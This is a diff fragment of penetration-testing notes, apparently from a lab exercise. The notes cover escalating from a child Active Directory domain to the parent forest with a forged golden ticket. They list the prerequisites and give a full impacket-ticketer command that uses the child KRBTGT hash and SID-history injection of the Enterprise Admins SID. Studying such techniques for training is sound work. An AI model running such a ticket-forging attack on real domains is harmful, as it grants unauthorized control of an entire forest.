@@ -37,6 +37,7 @@ Requires
 * The name of a target user in the child domain (does not need to exist!)
 * The FQDN of the child domain.
 * The SID of the Enterprise Admins group of the root domain.(impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5(dc of parent domain))
+
 Manual way:
 ```
 impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f(KRBTGT hash for the child domain) -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689(child domain) -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519(SID of the Enterprise Admins group of the parent domain) hacker
